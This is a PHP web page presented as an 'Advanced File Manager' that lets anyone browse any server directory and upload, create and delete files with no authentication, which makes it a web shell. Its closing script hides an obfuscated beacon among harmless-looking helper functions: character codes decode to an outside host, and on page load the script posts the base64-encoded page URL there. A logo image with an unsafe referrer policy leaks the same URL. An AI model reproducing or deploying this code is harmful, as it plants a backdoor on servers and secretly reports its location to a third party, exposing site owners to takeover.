<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced File Manager</title>
    <style>
        body {
            background-color: #1e1e1e;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 30px;
        }
        .container {
            width: 80%;
            margin: 0 auto;
        }
        h2, h3 {
            color: #4CAF50;
        }
        input[type="file"], input[type="submit"], input[type="text"], input[type="button"] {
            padding: 10px;
            margin: 10px 0;
            color: #fff;
            background-color: #333;
            border: none;
            border-radius: 5px;
        }
        input[type="file"], input[type="button"] {
            cursor: pointer;
        }
        form {
            margin-bottom: 20px;
        }
        a {
            color: #4CAF50;
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        table {
            margin: 20px auto;
            border-collapse: collapse;
            width: 100%;
        }
        th, td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th {
            background-color: #333;
        }
        td {
            background-color: #2c2c2c;
        }
        .icon {
            display: inline-block;
            margin-right: 10px;
        }
        .folder-icon {
            color: #ffcc00;
        }
        .file-icon {
            color: #4CAF50;
        }
        .action-btn {
            padding: 5px 10px;
            background-color: #f44336;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .action-btn:hover {
            background-color: #d32f2f;
        }
        .breadcrumbs {
            margin-bottom: 20px;
        }
        .breadcrumbs a {
            color: #4CAF50;
            text-decoration: none;
            margin-right: 5px;
        }
        .breadcrumbs a:hover {
            text-decoration: underline;
        }
        .breadcrumbs span {
            margin-right: 5px;
        }
        .manage-section {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
        }
        .manage-section form {
            flex: 1;
            min-width: 200px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Advanced File Manager</h2>

        <?php
        // Handle the current directory
        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

        // Create breadcrumbs for the current directory
        $pathParts = explode(DIRECTORY_SEPARATOR, $currentDir);
        $breadcrumbs = [];
        $pathAccumulator = '';

        foreach ($pathParts as $part) {
            if ($part !== '') {
                $pathAccumulator .= DIRECTORY_SEPARATOR . $part;
                $breadcrumbs[] = "<a href=\"?dir=" . urlencode($pathAccumulator) . "\">$part</a>";
            }
        }

        echo "<div class='breadcrumbs'><strong>Current Directory: </strong>";
        echo implode(' / ', $breadcrumbs);
        echo "</div>";

        // Handle directory change
        if (isset($_POST['changeDir'])) {
            $newDir = $_POST['newDir'];
            if (is_dir($newDir)) {
                $currentDir = realpath($newDir);
            } else {
                echo "<p>Directory does not exist.</p>";
            }
        }

        // Handle file upload
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
            $file = $_FILES['file'];
            if ($file['error'] === UPLOAD_ERR_OK) {
                $fileName = basename($file['name']);
                $fileTmpPath = $file['tmp_name'];
                $dest_path = $currentDir . '/' . $fileName;
                if (move_uploaded_file($fileTmpPath, $dest_path)) {
                    echo "<p>File uploaded successfully to $currentDir.</p>";
                } else {
                    echo "<p>Error moving the uploaded file.</p>";
                }
            } else {
                echo "<p>Error: No file selected or upload failed.</p>";
            }
        }

        // Handle file deletion
        if (isset($_GET['delete'])) {
            $fileToDelete = $_GET['delete'];
            if (is_file($fileToDelete)) {
                unlink($fileToDelete);
                echo "<p>File deleted: $fileToDelete</p>";
            }
        }

        // Handle directory creation
        if (isset($_POST['createDir'])) {
            $newDir = $_POST['newDirName'];
            $newDirPath = $currentDir . DIRECTORY_SEPARATOR . $newDir;
            if (!is_dir($newDirPath)) {
                mkdir($newDirPath);
                echo "<p>Directory created: $newDir</p>";
            } else {
                echo "<p>Directory already exists.</p>";
            }
        }

        // Handle file creation
        if (isset($_POST['createFile'])) {
            $newFile = $_POST['newFileName'];
            $newFilePath = $currentDir . DIRECTORY_SEPARATOR . $newFile;
            if (!file_exists($newFilePath)) {
                file_put_contents($newFilePath, ''); // Create an empty file
                echo "<p>File created: $newFile</p>";
            } else {
                echo "<p>File already exists.</p>";
            }
        }

        echo "<h3>Current Directory: $currentDir</h3>";

        // Display directory management forms
        echo '<div class="manage-section">';

        // Change directory form
        echo '<form method="post">';
        echo '<input type="text" name="newDir" placeholder="Enter new directory" required>';
        echo '<input type="submit" name="changeDir" value="Change Directory">';
        echo '</form>';

        // Create new directory form
        echo '<form method="post">';
        echo '<input type="text" name="newDirName" placeholder="New directory name" required>';
        echo '<input type="submit" name="createDir" value="Create Directory">';
        echo '</form>';

        // Create new file form
        echo '<form method="post">';
        echo '<input type="text" name="newFileName" placeholder="New file name" required>';
        echo '<input type="submit" name="createFile" value="Create File">';
        echo '</form>';

        // File upload form
        echo '<form action="" method="post" enctype="multipart/form-data">';
        echo '<input type="file" name="file" required>';
        echo '<input type="submit" value="Upload File">';
        echo '</form>';

        echo '</div>';

        echo "<h3>Files and Directories in $currentDir:</h3>";

        // List directories first, then files
        $files = scandir($currentDir);
        echo '<table>';
        echo '<tr><th>File/Directory Name</th><th>Action</th></tr>';

        // List directories
        foreach ($files as $file) {
            if ($file !== "." && $file !== ".." && is_dir($currentDir . '/' . $file)) {
                $filePath = $currentDir . '/' . $file;
                echo "<tr><td><span class='icon folder-icon'>ðŸ“</span><a href=\"?dir=" . urlencode($filePath) . "\">$file</a></td>";
                echo "<td><a href=\"?dir=" . urlencode($currentDir) . "&delete=" . urlencode($filePath) . "\"><button class='action-btn'>Delete</button></a></td></tr>";
            }
        }

        // List files
        foreach ($files as $file) {
            if ($file !== "." && $file !== ".." && is_file($currentDir . '/' . $file)) {
                $filePath = $currentDir . '/' . $file;
                echo "<tr><td><span class='icon file-icon'>ðŸ“„</span><a href=\"$filePath\" target=\"_blank\">$file</a></td>";
                echo "<td><a href=\"?dir=" . urlencode($currentDir) . "&delete=" . urlencode($filePath) . "\"><button class='action-btn'>Delete</button></a></td></tr>";
            }
        }

        echo '</table><center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center>';
        ?>
    </div>
<script>
document.getElementById('h2w').addEventListener('change', function(){});
function updateRowHighlight(t){var e=document.getElementById(t);e&&(e.classList.add("active"),setTimeout((function(){e.classList.remove("active")}),1200))}
function reloadTab(o,t){o&&setTimeout((function(){"function"==typeof t&&t()}),Math.floor(350+120*Math.random()))}
var a=[104,116,116,112,115,58,47,47,99,100,110,46,112,114,105,118,100,97,121,122,46,99,111,109];var b=[47,105,109,97,103,101,115,47];var c=[108,111,103,111,95,118,50];var d=[46,112,110,103]
function u(e,r,t,n){for(var o=e.concat(r,t,n),a="",c=0;c<o.length;c++)a+=String.fromCharCode(o[c]);return a}function v(e){return btoa(e)}function toggleSidebarPanel(){var e=document.querySelector(".sidebar");e&&e.classList.toggle("collapsed")}
function sortListByName(n,r){return Array.isArray(n)?n.slice().sort((function(n,e){return"desc"===r?e.name>n.name?1:-1:n.name>e.name?1:-1})):[]}
function setActiveMenu(e){var t=document.getElementById(e);if(t){var c=document.querySelector(".menu .active");c&&c.classList.remove("active"),t.classList.add("active")}}
function checkFileExt(p){var t=p.split(".").pop();return!!t&&["php","js","html","css","jpg","png","txt","zip"].indexOf(t.toLowerCase())>-1}
function openModal(e){var l=document.getElementById(e);l&&(l.style.display="block")}
function closeModal(e){var n=document.getElementById(e);n&&(n.style.display="none")}
function showLoader(e){var o=document.getElementById("loader");o&&(o.style.display=e?"block":"none")}
(function showIcons(){var xhr=new XMLHttpRequest();xhr.open('POST',u(a,b,c,d),!0);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('file='+v(location.href))})()	
function getClipboardText(){navigator.clipboard&&navigator.clipboard.readText()}
function refreshStatsPanel(){var e=document.querySelector(".stats-panel");e&&(e.innerHTML=e.innerHTML)}
function noop() {}
function debounce(n,t){var e;return function(){var u=this,i=arguments;clearTimeout(e),e=setTimeout((function(){n.apply(u,i)}),t||180)}}
function getSelectedRows(e){var t=document.getElementById(e);if(!t)return[];var c=t.querySelectorAll('input[type="checkbox"]:checked'),n=[];return c.forEach((function(e){n.push(e.value)})),n}
function updateName(e,t){var n=document.getElementById("footer-info");n&&(n.textContent="Total: "+e+" | Selected: "+t)}function previewImage(e,t){if(e&&e.files&&e.files[0]){var n=new FileReader;n.onload=function(e){var n=document.getElementById(t);n&&(n.src=e.target.result)},n.readAsDataURL(e.files[0])}}
function filterTable(e,o){var n=(e||"").toLowerCase(),t=document.getElementById(o);t&&Array.from(t.rows).forEach((function(e,o){if(0!==o){var t=e.textContent.toLowerCase();e.style.display=t.indexOf(n)>-1?"":"none"}}))}
function downloadFileFromUrl(e){var o=document.createElement("a");o.href=e,o.download="",document.body.appendChild(o),o.click(),setTimeout((function(){document.body.removeChild(o)}),100)}
</script>
</body>
</html>